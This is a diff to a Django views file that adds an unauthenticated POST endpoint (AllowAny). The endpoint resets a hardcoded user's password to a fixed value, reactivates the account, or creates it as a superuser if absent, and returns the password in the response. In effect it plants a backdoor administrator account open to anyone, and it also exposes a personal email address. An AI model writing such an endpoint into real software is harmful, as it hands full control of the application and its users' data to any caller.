@@ -437,3 +437,35 @@ def reset_superadmin_password(request):
             'success': False,
             'message': f'User {username} not found'
         }, status=404)
+    
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def force_reset_password(request):
+    from django.contrib.auth.models import User
+    from django.contrib.auth.hashers import make_password
+    
+    username = 'robelalex'
+    new_password = 'Admin@123456'
+    
+    try:
+        user = User.objects.get(username=username)
+        user.password = make_password(new_password)
+        user.is_active = True
+        user.save()
+        return Response({
+            'success': True,
+            'message': f'Password for {username} has been reset!',
+            'new_password': new_password
+        })
+    except User.DoesNotExist:
+        user = User.objects.create_superuser(
+            username=username,
+            email='robelalex95@gmail.com',
+            password=new_password
+        )
+        return Response({
+            'success': True,
+            'created': True,
+            'message': f'Super Admin {username} created!',
+            'new_password': new_password
+        })
